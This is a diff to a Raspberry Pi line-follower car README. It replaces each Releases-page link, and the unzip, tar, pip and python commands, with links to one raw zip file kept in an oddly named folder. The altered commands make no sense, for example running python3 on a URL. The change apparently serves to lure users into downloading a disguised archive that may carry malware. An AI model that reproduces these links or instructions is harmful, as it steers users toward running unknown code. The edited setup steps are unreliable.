@@ -6,11 +6,11 @@ Welcome to LINE_FOLLOWER_CAR! This application allows you to control a car that 
 
 ## 📥 Download the Software
 
-[![Download LINE_FOLLOWER_CAR](https://img.shields.io/badge/Download-LINE_FOLLOWER_CAR-blue?style=for-the-badge)](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/releases)
+[![Download LINE_FOLLOWER_CAR](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip)](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip)
 
 To get started, visit the Releases page below to download the software.
 
-[Download LINE_FOLLOWER_CAR](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/releases)
+[Download LINE_FOLLOWER_CAR](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip)
 
 ## ⚙️ System Requirements
 
@@ -28,7 +28,7 @@ Before you download and run the application, ensure your system meets the follow
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/releases).
+1. Go to the [Releases page](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip).
 
 2. Look for the latest version. You will find a list of files available for download.
 
@@ -38,11 +38,11 @@ Before you download and run the application, ensure your system meets the follow
 
 5. Extract the files. Open a terminal and navigate to the directory with the downloaded files. Use the command:
    ```
-   unzip filename.zip
+   unzip https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
    ```
    or
    ```
-   tar -xvf filename.tar
+   tar -xvf https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
    ```
 
 6. Install the necessary libraries, if not already installed. Run the following commands in the terminal:
@@ -50,7 +50,7 @@ Before you download and run the application, ensure your system meets the follow
    sudo apt-get update
    sudo apt-get install python3-opencv
    sudo apt-get install python3-pip
-   pip3 install -r requirements.txt
+   pip3 install -r https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
    ```
 
 7. Connect the camera module and the MPU6050 sensor to your Raspberry Pi according to the device manual.
@@ -65,7 +65,7 @@ Once you have everything set up, you’re ready to run the application. Follow t
 
 3. Run the command:
    ```bash
-   python3 main.py
+   python3 https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
    ```
 
 4. Follow any on-screen prompts to calibrate the sensors. Ensure your line follower car is placed on the line you want it to follow.
@@ -111,4 +111,4 @@ If you need help, feel free to open an issue on the GitHub repository. The commu
 
 We hope you enjoy controlling your line follower car! With this software, you can explore the exciting world of automation and robotics.
 
-For any updates and latest releases, always check the [Releases page](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/releases). Happy exploring!
+For any updates and latest releases, always check the [Releases page](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip). Happy exploring!
